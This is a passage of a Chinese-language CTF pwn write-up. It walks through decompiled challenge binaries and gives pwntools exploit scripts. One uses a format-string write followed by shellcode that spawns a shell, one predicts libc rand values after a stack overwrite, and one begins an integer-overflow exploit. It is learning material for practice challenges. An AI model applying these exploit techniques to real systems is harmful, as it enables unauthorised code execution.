</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [sp+78h] [bp-8h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;You travel a short distance east.That&#39;s odd, anyone disappear suddenly&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;, what happend?! You just travel , and find another hole&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;You recall, a big black hole will suckk you into it! Know what should you do?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;go into there(1), or leave(0)?:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>_isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;A voice heard in your mind&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;&#39;Give me an address&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>_isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%ld&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;And, you wish is:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>_isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>format</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Your wish is&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>format</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>format</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;I hear it, I hear it....&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>)</span> <span class=o>^</span> <span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>sub_400CA6函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_400CA6</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>v1</span><span class=p>;</span> <span class=c1>// rsi@2
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [sp+18h] [bp-8h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Dragon say: HaHa! you were supposed to have a normal&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;RPG game, but I have changed it! you have no weapon and &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;skill! you could not defeat me !&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;That&#39;s sound terrible! you meet final boss!but you level is ONE!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>a1</span> <span class=o>==</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Wizard: I will help you! USE YOU SPELL&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v1</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0LL</span><span class=p>,</span> <span class=mh>0x1000uLL</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>33</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>v1</span><span class=p>,</span> <span class=mh>0x100uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=n>_QWORD</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=p>))</span><span class=n>v1</span><span class=p>)(</span><span class=mi>0LL</span><span class=p>,</span> <span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>)</span> <span class=o>^</span> <span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>做到这里就不会了，预估是利用printf(&amp;format, &amp;format);在前面生成的随机地址处写入值</p><p>将format赋值为%x,%x,%x&mldr;%x，得到第7个参数与我们输入的v2的值是一致的</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=err>&#39;</span><span class=n>Give</span> <span class=n>me</span> <span class=n>an</span> <span class=n>address</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl><span class=mi>136</span>
</span></span><span class=line><span class=cl><span class=n>And</span><span class=p>,</span> <span class=n>you</span> <span class=n>wish</span> <span class=nl>is</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span><span class=p>,</span><span class=o>%</span><span class=n>x</span>
</span></span><span class=line><span class=cl><span class=n>Your</span> <span class=n>wish</span> <span class=n>is</span>
</span></span><span class=line><span class=cl><span class=mi>13</span><span class=n>da97e3</span><span class=p>,</span><span class=mi>13</span><span class=n>daa8c0</span><span class=p>,</span><span class=mi>13</span><span class=n>acd224</span><span class=p>,</span><span class=n>c</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>13</span><span class=n>da52a0</span><span class=p>,</span><span class=mi>88</span><span class=p>,</span><span class=mi>252</span><span class=n>c7825</span><span class=p>,</span><span class=mi>2</span><span class=n>c78252c</span><span class=p>,</span><span class=mi>78252</span><span class=n>c78</span><span class=p>,</span><span class=mi>252</span><span class=n>c7825</span><span class=p>,</span><span class=mi>78252</span><span class=n>cI</span> <span class=n>hear</span> <span class=n>it</span><span class=p>,</span> <span class=n>I</span> <span class=n>hear</span> <span class=n>it</span><span class=p>....</span>
</span></span></code></pre></div><p>而在main函数中</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=p>(</span><span class=kr>__int64</span><span class=p>)</span><span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>v4</span> <span class=o>=</span> <span class=mi>68</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>85</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;secret[0] is %x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v5</span><span class=p>,</span> <span class=n>a2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;secret[1] is %x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v5</span> <span class=o>+</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;do not tell anyone &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>sub_400D72</span><span class=p>(</span><span class=n>v5</span><span class=p>);</span>
</span></span></code></pre></div><p>可知函数传入的参数为v5，而v5又与v4绑定，v4[0]=68,v4[1]=85,这样我们就可以结合前面得出的偏移和格式化字符串漏洞将v4[0]修改为85</p><p>在sub_400ca6中</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Wizard: I will help you! USE YOU SPELL&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v1</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0LL</span><span class=p>,</span> <span class=mh>0x1000uLL</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>33</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>v1</span><span class=p>,</span> <span class=mh>0x100uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=n>_QWORD</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=p>))</span><span class=n>v1</span><span class=p>)(</span><span class=mi>0LL</span><span class=p>,</span> <span class=n>v1</span><span class=p>);</span>
</span></span></code></pre></div><p>将v1转化为可执行函数，我们就在此处写入一个shell,构造的EXP如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=nf>process</span><span class=p>(</span><span class=s>&#34;./String&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=cp># p = remote(&#34;111.198.29.45&#34;,&#34;49404&#34;)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=nf>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=err>&#39;</span><span class=n>amd64</span><span class=err>&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=err>&#39;</span><span class=n>linux</span><span class=err>&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=err>&#39;</span><span class=n>debug</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>recvuntil</span><span class=p>(</span><span class=err>&#39;</span><span class=n>secret</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=n>is</span> <span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>v4_addr</span> <span class=o>=</span> <span class=kt>int</span><span class=p>(</span><span class=n>p</span><span class=p>.</span><span class=nf>recvuntil</span><span class=p>(</span><span class=sc>&#39;\n&#39;</span><span class=p>)[</span><span class=o>:-</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;What should your character&#39;s name be:&#34;</span><span class=p>,</span> <span class=sc>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;So, where you will go?east or up?:&#34;</span><span class=p>,</span> <span class=err>&#39;</span><span class=n>east</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;go into there(1), or leave(0)?:&#34;</span><span class=p>,</span> <span class=sc>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;&#39;Give me an address&#39;&#34;</span><span class=p>,</span> <span class=nf>str</span><span class=p>(</span><span class=kt>int</span><span class=p>(</span><span class=n>v4_addr</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;And, you wish is:&#34;</span><span class=p>,</span> <span class=err>&#39;</span><span class=o>%</span><span class=mi>85</span><span class=n>c</span><span class=o>%</span><span class=mi>7</span><span class=err>$</span><span class=n>n</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=k>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=p>.</span><span class=nf>sh</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;USE YOU SPELL&#34;</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>interactive</span><span class=p>()</span>
</span></span></code></pre></div><blockquote><p>获得执行system(“/bin/sh”)汇编代码所对应的机器码： asm(<a href=http://shellcraft.sh/>shellcraft.sh</a>()) 。注意要指明arch和os。arch有i386(x86)和amd64(x64)。攻防世界的题解区有人说这个函数失效，其实是因为他没指明环境。不同环境下的汇编代码是不同的。-攻防世界WP区</p></blockquote><h1 id=guess_num>Guess_num</h1><p>看了IDA的反汇编的代码也是毫无头绪，看了WP之后感觉有个点是不知道的就是在IDA点击一个变量名可以看到他与其他变量的偏移关系，000000000030处就是gets(&amp;v10)中的v10</p><p><img src=https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa8e31d9-cadf-482f-8a2a-c254c5e79493/Untitled.png alt=Untitled></p><p>构造EXP</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>from</span> <span class=n>ctypes</span> <span class=n>import</span> <span class=o>*</span>  <span class=err>#</span><span class=n>python</span><span class=err>的一个外部函数库</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>cdll</span><span class=p>.</span><span class=nf>LoadLibrary</span><span class=p>(</span><span class=s>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class=p>)</span>  <span class=err>#调用</span><span class=n>DLL</span><span class=err>中输出的</span><span class=n>C</span><span class=err>接口函数</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>b</span><span class=sc>&#39;a&#39;</span><span class=o>*</span><span class=mi>32</span> <span class=o>+</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=nf>process</span><span class=p>(</span><span class=s>&#34;guessnum&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=cp>#p = remote(&#39;111.198.29.45&#39;,50351)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=n>libc</span><span class=p>.</span><span class=nf>srand</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=err>&#39;</span><span class=nl>name</span><span class=p>:</span><span class=err>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=n>in</span> <span class=nf>range</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span><span class=o>:</span>  <span class=err>#输入以</span><span class=mi>1</span><span class=err>为</span><span class=n>seed</span><span class=err>，前十次所产生的伪随机数</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=err>&#39;</span><span class=nl>number</span><span class=p>:</span><span class=err>&#39;</span><span class=p>,</span><span class=nf>str</span><span class=p>(</span><span class=n>libc</span><span class=p>.</span><span class=nf>rand</span><span class=p>()</span><span class=o>%</span><span class=mi>6</span> <span class=o>+</span> <span class=mi>1</span><span class=p>))</span> 
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>interactive</span><span class=p>()</span>
</span></span></code></pre></div><blockquote><p>ctypes是Python的外部函数库。它提供C兼容的数据类型，并允许在DLL或共享库中调用函数。它可以用于将这些库包装在纯Python中。</p></blockquote><h1 id=int_overflow>int_overflow</h1><blockquote><p>C 库函数 void *memset(void *str, int c, size_t n) 复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。</p></blockquote><blockquote><p>ssize_t read(int fd, void * buf, size_t count);
函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.</p></blockquote><p>若是read第一个数字应该是从接受输入，将输入的前count个字符传送到buf指针所指的内存中</p><p>不会做啊啊啊啊</p><p>只有字符在3-8这个长度才能到存在溢出的函数处，但是这样就没有办法溢出了呀,看了WP</p><p>先看main函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [sp+Ch] [bp-Ch]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;---------------------&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;~~ Welcome to CTF! ~~&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;       1.Login       &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;       2.Exit        &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;---------------------&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Your choice:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v4</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>login</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>v4</span> <span class=o>==</span> <span class=mi>2</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Bye~&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid Choice!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>直接看login函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=nf>login</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [sp+0h] [bp-228h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>s</span><span class=p>;</span> <span class=c1>// [sp+200h] [bp-28h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x20u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x200u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please input your username:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=mh>0x19u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Hello %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please input your passwd:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x199u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>check_passwd</span><span class=p>(</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>check_passwd函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=kr>__cdecl</span> <span class=nf>check_passwd</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>result</span><span class=p>;</span> <span class=c1>// eax@3
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>dest</span><span class=p>;</span> <span class=c1>// [sp+4h] [bp-14h]@3
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [sp+Fh] [bp-9h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v3</span> <span class=o>&lt;=</span> <span class=mi>3u</span> <span class=o>||</span> <span class=n>v3</span> <span class=o>&gt;</span> <span class=mi>8u</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid Password&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Success&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nf>strcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dest</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>这里要注意的几个点</p><ul><li>read函数第一个参数为0则不读取文件了，read(0, &amp;s, 0x19u)大意为从键盘输入取前0x19个字符然后赋值给s</li><li>int8即声明大小为8个bit大小，unsigned 则表明8个字符，无符号位，大小则为0~255</li></ul><p><img src=https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3e75f011-2915-43a2-9b0f-db0125872f92/Untitled.png alt=Untitled></p><p>可以看到s为0x14大小时即可影响栈内的内容</p><p>此时我们构造EXP</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=nf>process</span><span class=p>(</span><span class=s>&#34;./intoverflow&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=cp># p = remote(&#34;111.198.29.45&#34;,53314)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>b</span><span class=sc>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x14</span>
